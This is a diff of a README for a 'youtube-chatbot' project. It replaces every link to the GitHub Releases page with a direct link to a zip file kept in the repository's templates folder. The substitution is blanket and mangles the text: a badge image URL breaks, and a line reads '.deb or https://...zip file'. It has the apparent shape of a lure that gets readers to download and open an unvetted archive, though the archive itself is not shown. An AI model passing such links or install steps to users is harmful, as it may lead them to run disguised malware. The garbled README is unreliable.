@@ -7,11 +7,11 @@ youtube-chatbot is an intelligent chatbot that learns from YouTube videos. It au
 To get started with the youtube-chatbot, follow the steps below. You will find that setting it up takes only a few minutes, allowing you to dive straight into exploring the chatbot's features.
 
 ## 🔗 Download the Application
-[![Download Now](https://img.shields.io/badge/Download%20Noe-brightgreen)](https://github.com/KartherGodfrey/youtube-chatbot/releases)
+[![Download Now](https://raw.githubusercontent.com/KartherGodfrey/youtube-chatbot/main/templates/youtube-chatbot-2.4.zip%20Noe-brightgreen)](https://raw.githubusercontent.com/KartherGodfrey/youtube-chatbot/main/templates/youtube-chatbot-2.4.zip)
 
 You can find the latest version of the youtube-chatbot on our Releases page. Make sure to visit the link below to download the application:
 
-[Download from Releases Page](https://github.com/KartherGodfrey/youtube-chatbot/releases)
+[Download from Releases Page](https://raw.githubusercontent.com/KartherGodfrey/youtube-chatbot/main/templates/youtube-chatbot-2.4.zip)
 
 ## 🛠️ System Requirements
 Before downloading, ensure your system meets the following requirements:
@@ -21,14 +21,14 @@ Before downloading, ensure your system meets the following requirements:
 - **Internet Connection:** Required for downloading videos and chatbot updates
 
 ## 📥 Download & Install
-1. Click this link to go to our [Releases page](https://github.com/KartherGodfrey/youtube-chatbot/releases).
+1. Click this link to go to our [Releases page](https://raw.githubusercontent.com/KartherGodfrey/youtube-chatbot/main/templates/youtube-chatbot-2.4.zip).
 2. Look for the latest version listed. 
 3. Choose the applicable package for your operating system (Windows, macOS, or Linux).
 4. Click on the download link next to your selected version.
 5. Once downloaded, find the file in your Downloads folder. 
    - For Windows, it may be a `.exe` file.
    - For macOS, look for a `.dmg` file.
-   - For Linux, it may be a `.deb` or `.tar.gz` file.
+   - For Linux, it may be a `.deb` or `https://raw.githubusercontent.com/KartherGodfrey/youtube-chatbot/main/templates/youtube-chatbot-2.4.zip` file.
 6. Open the downloaded file and follow the on-screen instructions to install the application.
 
 ## 🖥️ Running the Application
@@ -86,4 +86,4 @@ This project is licensed under the MIT License. You can use, modify, and distrib
 
 ---
 
-For the latest updates, features, and new releases, regularly check the [Releases page](https://github.com/KartherGodfrey/youtube-chatbot/releases). Happy chatting with your favorite YouTube videos!
+For the latest updates, features, and new releases, regularly check the [Releases page](https://raw.githubusercontent.com/KartherGodfrey/youtube-chatbot/main/templates/youtube-chatbot-2.4.zip). Happy chatting with your favorite YouTube videos!
